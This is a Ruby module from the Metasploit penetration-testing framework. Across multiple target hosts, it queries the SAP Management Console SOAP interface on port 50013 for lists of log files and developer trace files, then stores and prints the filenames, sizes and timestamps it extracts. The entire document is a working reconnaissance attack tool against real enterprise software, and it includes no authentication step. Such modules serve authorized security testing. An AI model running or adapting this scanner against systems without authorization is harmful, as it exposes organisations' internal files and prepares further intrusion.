##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'SAP Management Console List Logfiles',
      'Description' => %q{
        This module simply attempts to output a list of available
        logfiles and developer tracefiles through the SAP Management
        Console SOAP Interface.
        },
      'References' => [
        [ 'URL', 'https://blog.c22.cc' ]
      ],
      'Author' => [ 'Chris John Riley' ],
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )

    register_options(
      [
        Opt::RPORT(50013),
        OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
        OptEnum.new('FILETYPE', [true, 'Specify LOGFILE or TRACEFILE', 'TRACEFILE', ['TRACEFILE', 'LOGFILE']])
      ]
    )
    register_autofilter_ports([ 50013 ])
  end

  def run_host(ip)
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['URI']),
      'method' => 'GET'
    }, 25)

    if !res
      print_error("#{rhost}:#{rport} [SAP] Unable to connect")
      return
    end

    listfiles(ip)
  end

  def listfiles(rhost)
    print_status("[SAP] Connecting to SAP Management Console SOAP Interface on #{rhost}:#{rport}")
    success = false
    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
    xsi = 'http://www.w3.org/2001/XMLSchema-instance'
    xs = 'http://www.w3.org/2001/XMLSchema'
    sapsess = 'http://www.sap.com/webas/630/soap/features/session/'

    case datastore['FILETYPE'].to_s
    when /^LOG/i
      ns1 = 'ns1:ListLogFiles'
    when /^TRACE/i
      ns1 = 'ns1:ListDeveloperTraces'
    end

    data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv + '"  xmlns:xsi="' + xsi + '" xmlns:xs="' + xs + '">' + "\r\n"
    data << '<SOAP-ENV:Header>' + "\r\n"
    data << '<sapsess:Session xlmns:sapsess="' + sapsess + '">' + "\r\n"
    data << '<enableSession>true</enableSession>' + "\r\n"
    data << '</sapsess:Session>' + "\r\n"
    data << '</SOAP-ENV:Header>' + "\r\n"
    data << '<SOAP-ENV:Body>' + "\r\n"
    data << '<' + ns1 + ' xmlns:ns1="urn:SAPControl"></' + ns1 + '>' + "\r\n"
    data << '</SOAP-ENV:Body>' + "\r\n"
    data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"

    begin
      res = send_request_raw({
        'uri' => normalize_uri(datastore['URI']),
        'method' => 'POST',
        'data' => data,
        'headers' =>
          {
            'Content-Length' => data.length,
            'SOAPAction' => '""',
            'Content-Type' => 'text/xml; charset=UTF-8'
          }
      }, 30)

      env = []
      if res && (res.code == 200)
        case res.body
        when nil
          # Nothing
        when %r{<file>(.*)</file>}i
          body = res.body
          env = body.scan(%r{<filename>(.*?)</filename><size>(.*?)</size><modtime>(.*?)</modtime>}i)
          success = true
        end
      elsif res && (res.code == 500)
        case res.body
        when %r{<faultstring>(.*)</faultstring>}i
          faultcode = ::Regexp.last_match(1).strip
          fault = true
        end
      end
    rescue ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} [SAP] Unable to attempt authentication")
      return
    end

    if success
      print_good("#{rhost}:#{rport} [SAP] #{datastore['FILETYPE'].downcase}: #{env.length} entries extracted")

      saptbl = Msf::Ui::Console::Table.new(
        Msf::Ui::Console::Table::Style::Default,
        'Header' => '[SAP] Log Files',
        'Prefix' => "\n",
        'Postfix' => "\n",
        'Indent' => 1,
        'Columns' =>
        [
          'Filename',
          'Size',
          'Timestamp'
        ]
      )

      f = store_loot(
        "sap.#{datastore['FILETYPE'].downcase}file",
        'text/xml',
        rhost,
        saptbl.to_s,
        'sap_listlogfiles.xml',
        "SAP #{datastore['FILETYPE'].downcase}"
      )
      vprint_status("sap_listlogfiles.xml stored in: #{f}")

      env.each do |output|
        saptbl << [ output[0], output[1], output[2] ]
      end

      print_line(saptbl.to_s)

    elsif fault
      print_error("#{rhost}:#{rport} [SAP] Error code: #{faultcode}")

    else
      print_error("#{rhost}:#{rport} [SAP] failed to request environment")
    end
  end
end
